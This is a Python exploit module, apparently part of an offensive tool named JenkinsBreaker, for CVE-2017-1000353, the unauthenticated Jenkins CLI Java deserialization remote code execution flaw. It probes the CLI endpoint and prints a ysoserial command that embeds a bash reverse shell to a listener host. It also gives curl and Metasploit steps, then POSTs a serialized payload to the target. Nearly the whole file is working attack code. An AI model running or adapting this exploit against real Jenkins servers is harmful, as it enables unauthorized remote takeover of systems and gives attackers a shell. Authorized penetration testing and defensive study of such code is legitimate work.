"""
CVE-2017-1000353: Jenkins CLI Java Deserialization RCE

An unauthenticated remote code execution vulnerability that allows attackers to transfer
a serialized Java SignedObject to the remoting-based Jenkins CLI, which is deserialized
using a new ObjectInputStream, bypassing the existing blocklist-based protection mechanism.

This is one of the most critical Jenkins vulnerabilities as it allows unauthenticated RCE.
"""

import requests
import socket
import struct
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2017-1000353"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins CLI Java Deserialization RCE",
    description="Unauthenticated RCE via Java deserialization in remoting-based CLI",
    affected_versions=["<= 2.56", "<= 2.46.1 LTS"],
    mitre_attack=["T1190", "T1059"],
    severity="critical",
    references=[
        "https://jenkins.io/security/advisory/2017-04-26/",
        "https://nvd.nist.gov/vuln/detail/CVE-2017-1000353",
        "https://www.rapid7.com/db/modules/exploit/linux/http/jenkins_cli_deserialization"
    ],
    requires_auth=False,
    requires_crumb=False,
    tags=["rce", "deserialization", "unauthenticated", "cli"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance has remoting-based CLI enabled.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if potentially vulnerable, False otherwise
    """
    try:
        cli_url = f"{tool.jenkins_url}/cli"
        r = requests.get(cli_url, verify=False, timeout=5)
        
        if r.status_code == 200 and 'Jenkins-CLI' in r.headers.get('X-Jenkins', ''):
            console.print("[yellow][*] Jenkins CLI endpoint accessible[/yellow]")
            return True
        
        try:
            from urllib.parse import urlparse
            parsed = urlparse(tool.jenkins_url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            cli_port = kwargs.get('cli_port', port)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, cli_port))
            sock.close()
            
            if result == 0:
                console.print(f"[yellow][*] TCP port {cli_port} is open (possible CLI port)[/yellow]")
                return True
        except:
            pass
        
        return False
    except Exception as e:
        console.print(f"[red][!] Error checking vulnerability: {e}[/red]")
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2017-1000353 for unauthenticated RCE via CLI deserialization.
    
    This is a complex exploit requiring serialized Java payload generation.
    For production use, integrate with ysoserial or similar tools.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host for reverse shell
        lport: Listener port for reverse shell
        **kwargs: Additional arguments (cli_port, payload_file)
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Java Deserialization RCE)...[/yellow]")
    console.print("[yellow][!] NOTE: This exploit requires serialized Java payload generation[/yellow]")
    
    from urllib.parse import urlparse
    parsed = urlparse(tool.jenkins_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    cli_port = kwargs.get('cli_port', port)
    
    console.print(f"[cyan][*] Target: {host}:{cli_port}[/cyan]")
    
    console.print("[cyan][*] Checking CLI endpoint accessibility...[/cyan]")
    try:
        cli_url = f"{tool.jenkins_url}/cli"
        r = requests.get(cli_url, verify=False, timeout=5)
        
        if r.status_code != 200:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details="CLI endpoint not accessible or disabled"
            )
        
        console.print("[green][+] CLI endpoint accessible[/green]")
    except Exception as e:
        return ExploitResult(
            exploit=CVE_ID,
            status="error",
            details=f"Error accessing CLI endpoint: {e}"
        )
    
    payload_file = kwargs.get('payload_file')
    
    if not payload_file:
        console.print("[yellow][!] EXPLOITATION STEPS:[/yellow]")
        console.print("[cyan]1. Generate serialized payload using ysoserial:[/cyan]")
        console.print(f"   java -jar ysoserial.jar CommonsCollections1 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' > payload.ser")
        console.print("[cyan]2. Re-run exploit with --payload-file payload.ser[/cyan]")
        console.print()
        console.print("[yellow][*] For manual exploitation:[/yellow]")
        console.print(f"   curl -X POST {tool.jenkins_url}/cli --data-binary @payload.ser")
        console.print()
        console.print("[yellow][*] Alternative: Use Metasploit module:[/yellow]")
        console.print("   use exploit/linux/http/jenkins_cli_deserialization")
        console.print(f"   set RHOST {host}")
        console.print(f"   set RPORT {cli_port}")
        console.print(f"   set LHOST {lhost}")
        console.print(f"   set LPORT {lport}")
        console.print("   exploit")
        
        return ExploitResult(
            exploit=CVE_ID,
            status="partial",
            details="Exploitation requires serialized Java payload. See console output for manual steps.",
            data={
                "target": f"{host}:{cli_port}",
                "cli_url": f"{tool.jenkins_url}/cli",
                "ysoserial_command": f"java -jar ysoserial.jar CommonsCollections1 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' > payload.ser",
                "curl_command": f"curl -X POST {tool.jenkins_url}/cli --data-binary @payload.ser"
            }
        )
    
    try:
        with open(payload_file, 'rb') as f:
            payload = f.read()
        
        console.print(f"[cyan][*] Loaded payload from {payload_file} ({len(payload)} bytes)[/cyan]")
        console.print(f"[cyan][*] Sending payload to {tool.jenkins_url}/cli...[/cyan]")
        
        r = requests.post(
            f"{tool.jenkins_url}/cli",
            data=payload,
            headers={'Content-Type': 'application/octet-stream'},
            verify=False,
            timeout=15
        )
        
        if r.status_code in [200, 204]:
            console.print("[green][+] Payload sent successfully![/green]")
            console.print(f"[green][+] Check listener on {lhost}:{lport} for shell[/green]")
            return ExploitResult(
                exploit=CVE_ID,
                status="success",
                details="Serialized payload sent to CLI endpoint",
                data={
                    "payload_size": len(payload),
                    "http_status": r.status_code,
                    "listener": f"{lhost}:{lport}"
                }
            )
        else:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details=f"Payload sent but unexpected response: HTTP {r.status_code}"
            )
    
    except FileNotFoundError:
        return ExploitResult(
            exploit=CVE_ID,
            status="error",
            details=f"Payload file not found: {payload_file}"
        )
    except Exception as e:
        return ExploitResult(
            exploit=CVE_ID,
            status="error",
            details=f"Error sending payload: {str(e)}"
        )
